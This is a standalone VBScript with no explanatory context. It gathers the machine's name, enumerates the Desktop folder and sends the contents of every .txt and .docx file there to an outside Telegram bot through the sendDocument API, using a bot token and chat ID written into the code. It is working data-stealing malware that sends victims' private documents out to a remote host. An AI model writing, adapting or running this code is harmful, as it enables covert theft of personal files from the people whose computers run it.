Dim WshShell, fso, botToken, chatId, computerId
Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

botToken = "8711318219:AAFj7ddap7JMNibxMSwIDBcBd8IS36jm6NA"
chatId   = "8221773638"

computerId = WshShell.ExpandEnvironmentStrings("%COMPUTERNAME%")

Dim desktopPath
desktopPath = WshShell.SpecialFolders("Desktop")

Sub SendFile(filePath)
    If Not fso.FileExists(filePath) Then Exit Sub
    
    Dim fileName, ext
    fileName = fso.GetFileName(filePath)
    ext = LCase(fso.GetExtensionName(fileName))
    
    If ext <> "txt" And ext <> "docx" Then Exit Sub
    
    Dim http, ts, content
    Set http = CreateObject("MSXML2.XMLHTTP")
    
    Set ts = fso.OpenTextFile(filePath, 1, False, -2)
    content = ts.ReadAll
    ts.Close
    
    Dim url, postData
    url = "https://api.telegram.org/bot" & botToken & "/sendDocument"
    
    postData = "chat_id=" & chatId & "&caption=" & computerId & " | " & fileName & "&document=" & content
    
    http.Open "POST", url, False
    http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    http.Send postData
End Sub

Dim folder, file
Set folder = fso.GetFolder(desktopPath)

For Each file In folder.Files
    SendFile file.Path
Next

Set WshShell = Nothing
Set fso = Nothing
